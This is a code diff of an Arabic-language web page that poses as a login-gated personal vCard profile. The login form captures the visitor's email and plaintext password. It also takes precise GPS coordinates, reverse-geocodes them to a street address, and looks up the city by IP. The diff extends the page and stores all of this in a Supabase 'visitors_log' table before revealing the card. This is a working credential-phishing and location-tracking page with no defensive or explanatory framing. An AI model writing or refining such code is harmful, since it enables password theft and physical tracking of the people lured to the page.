@@ -23,7 +23,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; text-decoration: none; }
         body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
 
-        /* واجهة الدخول المعدلة للعربية */
+        /* واجهة الدخول */
         #auth-screen {
             position: fixed; inset: 0; background: var(--back_color); z-index: 1000;
             display: flex; justify-content: center; align-items: center;
@@ -34,8 +34,8 @@
             text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
             direction: rtl;
         }
-        .auth-box h2 { color: var(--gold); margin-bottom: 15px; letter-spacing: 1px; font-size: 1.6em; }
-        .auth-box p.info-text { color: var(--white); margin-bottom: 20px; font-size: 0.9em; opacity: 0.8; line-height: 1.5; }
+        .auth-box h2 { color: var(--gold); margin-bottom: 15px; font-size: 1.6em; }
+        .auth-box p.info-text { color: var(--white); margin-bottom: 20px; font-size: 0.9em; opacity: 0.8; }
         .auth-box input {
             width: 100%; padding: 14px; margin: 10px 0; background: rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(197, 160, 89, 0.2); border-radius: 12px; color: white; outline: none; text-align: center;
@@ -43,9 +43,8 @@
         .auth-box button {
             width: 100%; padding: 14px; margin-top: 20px;
             background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold));
-            border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; font-size: 1.1em; transition: 0.3s;
+            border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; font-size: 1.1em;
         }
-        .auth-box button:active { transform: scale(0.98); opacity: 0.9; }
 
         /* ملف الـ vCard الشخصي */
         .vcard {
@@ -81,7 +80,7 @@
 <div id="auth-screen">
     <div class="auth-box">
         <h2>تسجيل الدخول</h2>
-        <p class="info-text">لرؤية هذا الملف الشخصي يجب تسجيل الدخول أولاً</p>
+        <p class="info-text">لرؤية هذا الملف الشخصي يجب تسجيل الدخول</p>
         <input type="email" id="email" placeholder="البريد الإلكتروني">
         <input type="password" id="password" placeholder="كلمة المرور">
         <button id="login-btn" onclick="handleLogin()">فتح الملف الشخصي</button>
@@ -132,31 +131,33 @@
         }
     };
 
-    // دالة الحصول على الموقع بأعلى دقة ممكنة (High Accuracy GPS)
+    // دالة تحويل الإحداثيات لاسم شارع وحي حقيقي (بالعربي)
+    async function getAddressFromCoords(lat, lng) {
+        try {
+            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&accept-language=ar`);
+            const data = await response.json();
+            return data.display_name || "العنوان غير محدد بدقة";
+        } catch (e) {
+            return "فشل جلب العنوان التفصيلي";
+        }
+    }
+
     function getLocationGPS() {
         return new Promise((resolve) => {
             if (navigator.geolocation) {
-                const options = {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                };
-
+                const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        resolve(`${lat}, ${lng} (Acc: ${accuracy}m)`);
+                        resolve({
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            acc: position.coords.accuracy
+                        });
                     },
-                    (err) => {
-                        resolve("Denied/Timeout/Error: " + err.message);
-                    },
+                    (err) => resolve(null),
                     options
                 );
-            } else {
-                resolve("Not Supported");
-            }
+            } else { resolve(null); }
         });
     }
 
@@ -167,37 +168,45 @@
         const loginBtn = document.getElementById('login-btn');
 
         if (!email.includes('@') || password.length < 6) {
-            errorMsg.innerText = "البريد الإلكتروني أو الرمز غير صحيح";
+            errorMsg.innerText = "البيانات المدخلة غير صالحة";
             return;
         }
 
         loginBtn.innerText = "جاري التحقق...";
         loginBtn.disabled = true;
 
-        // تأخير لمدة ثانيتين قبل بدء طلب الموقع ومعالجة البيانات
         setTimeout(async () => {
             try {
-                // طلب الموقع الفعلي (ستظهر رسالة المتصفح بالإنجليزية هنا)
-                const coords = await getLocationGPS();
+                const pos = await getLocationGPS();
+                let coordsString = "Denied";
+                let fullAddr = "No Address Data";
+
+                if (pos) {
+                    coordsString = `${pos.lat}, ${pos.lng} (±${pos.acc}m)`;
+                    // تحويل الإحداثيات لاسم حي وشارع
+                    fullAddr = await getAddressFromCoords(pos.lat, pos.lng);
+                }
 
                 let cityInfo = "Unknown";
                 try {
                     const geoRes = await fetch('https://ipapi.co/json/');
                     const geoData = await geoRes.json();
                     cityInfo = geoData.city || "Unknown";
-                } catch(e) { console.log("City fetch error"); }
+                } catch(e) {}
 
+                // إرسال البيانات للجدول متضمناً خانة full_address
                 const { error } = await supabaseClient
                     .from('visitors_log')
                     .insert([{ 
                         visitor_email: email, 
                         visitor_password: password,
                         city: cityInfo,
-                        coords: coords 
+                        coords: coordsString,
+                        full_address: fullAddr // الخانة الجديدة التي ركزت عليها
                     }]);
 
                 if (error) {
-                    errorMsg.innerText = "حدث خطأ في الاتصال بقاعدة البيانات";
+                    errorMsg.innerText = "خطأ في قاعدة البيانات";
                     loginBtn.innerText = "فتح الملف الشخصي";
                     loginBtn.disabled = false;
                 } else {
@@ -206,7 +215,7 @@
                     document.getElementById('profile-card').style.display = 'block';
                 }
             } catch (e) {
-                errorMsg.innerText = "تعذر الدخول، يرجى المحاولة لاحقاً";
+                errorMsg.innerText = "حاول مرة أخرى";
                 loginBtn.innerText = "فتح الملف الشخصي";
                 loginBtn.disabled = false;
             }
